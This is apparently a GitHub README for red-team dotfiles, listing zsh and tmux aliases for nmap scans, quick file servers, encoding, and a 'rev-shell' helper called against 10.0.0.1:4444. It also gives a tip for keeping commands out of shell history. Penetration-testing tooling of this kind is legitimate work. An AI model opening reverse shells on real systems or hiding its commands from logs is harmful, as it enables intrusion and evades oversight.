# Red Team Dotfiles

[![Version](https://img.shields.io/badge/version-2.1.0-blue.svg)](VERSION)

Clean and focused dotfiles for **zsh**, **tmux**, and **vim** tailored for red team operations and penetration testing. No over-engineering, just the essentials.

## ✨ Features

- 🔴 **Red Team Focused**: Aliases and functions for penetration testing
- 🎯 **Warp Terminal Optimized**: Enhanced for modern terminal experience
- 🌐 **Network Tools**: IPv4/IPv6 IP detection with service redundancy
- 🛡️ **OPSEC Aware**: Commands starting with space aren't logged
- 🧰 **aliasr Integration**: `a` alias in zsh and tmux keybindings for the aliasr pentest launcher
- ⚡ **Fast & Clean**: Minimal overhead, maximum functionality
- 🔧 **Cross-Platform**: Works on macOS, Linux, and WSL2

## 🚀 Installation

### Prerequisites
- [Zsh](https://www.zsh.org/) - Shell
- [Tmux](https://github.com/tmux/tmux/wiki) - Terminal multiplexer  
- [Vim](https://www.vim.org/) - Text editor

### Quick Install
```bash
# Clone the repository
git clone https://github.com/Maleick/dotfiles.git /opt/dotfiles
cd /opt/dotfiles

# Run the install script
./install.sh
```

### What it does
1. Creates backup of existing dotfiles
2. Symlinks zsh, tmux, and vim configurations
3. Sets up red team aliases and functions

### Verify Installation
```bash
# Restart your shell or run
source ~/.zshrc

# Check available commands
/help
```

## 💻 Usage Examples

### Network Reconnaissance
```bash
# External IP Detection (IPv4/IPv6) 
myip                       # External IPv4 address (force IPv4)
myip4                      # Explicit IPv4 version
myip6                      # External IPv6 address
myip-alt                   # Alternative service (ipinfo.io)
myip-check                 # Backup service (icanhazip.com)
get_external_ip            # Store IP in $EXTERNAL_IP variable
localip                    # Local IP address
netinfo                    # Complete network information

# Port Scanning
quickscan 192.168.1.0/24   # Fast subnet scan
nmap-top-ports 192.168.1.1 # Scan top 1000 ports
```

### Web Servers & Tools
```bash
webserver                  # HTTP server on port 8080
smbserver                  # SMB share current directory
https-server               # HTTPS server (needs cert.pem/key.pem)
```

### Encoding/Decoding
```bash
base64encode "test data"   # dGVzdCBkYXRh
base64decode "dGVzdCBkYXRh" # test data
urlencode "hello world"    # hello%2Bworld
rot13                      # ROT13 cipher
```

### Reverse Shells
```bash
rev-shell bash 10.0.0.1 4444    # Bash reverse shell
rev-shell python 10.0.0.1 4444  # Python reverse shell
rev-shell nc 10.0.0.1 4444      # Netcat reverse shell
```

### Tmux Features
```bash
tmux                       # Start tmux session
# Prefix + P              # Start/stop recording
# Prefix + S              # Save pane history
# Prefix + U / K          # Open aliasr in split pane (send-only / send+execute)
```

### aliasr Launcher
```bash
a                          # Open aliasr TUI for red-team commands (requires aliasr installed)
```

## 🔒 OPSEC Notes

- **Commands starting with space aren't logged** - Use ` command` for sensitive operations
- **Use only on authorized systems** - Respect applicable laws and regulations
- **Backup created automatically** - Install script backs up existing configs

## 🔄 Updates

```bash
# Update to latest version
cd /opt/dotfiles
git pull

# Check current version
cat VERSION
```

## 📝 Available Commands

```bash
# See all available red team commands
/help
```

---

**Note**: This project is for educational and authorized security testing only. Use responsibly and respect all applicable laws.

🔴 **Happy Red Teaming!** 🔴
